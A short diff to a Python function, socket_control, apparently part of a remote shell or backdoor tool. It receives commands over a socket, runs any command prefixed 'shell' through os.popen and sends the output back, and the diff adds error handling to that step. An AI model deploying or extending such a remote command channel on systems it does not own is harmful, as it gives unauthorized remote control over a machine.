@@ -41,10 +41,15 @@ def socket_control():
 					while True:
 						data = decode(socket_server.recv(buffer))
 						if (data.split()[0] == "shell"):
-							#
-							# ToDo: Rewrite shell execute function since we have no error handling at the moment
-							#
-							socket_server.send(encode(execute(data.split()[1])))
+							try:
+								process_create = os.popen(data.split()[1])
+								process_result = process_create.read()
+								if process_result:
+									socket_server.send(encode(process_result))
+								else:
+									socket_server.send(encode("\nError while getting command result\n"))
+							except Exception as e:
+								socket_server.send(encode("\nError while executing command\n"))
 						elif (data.split()[0] == "quit"):
 							socket_server.send(encode("\nExiting/shutting down server\n"))
 							socket_server.close()
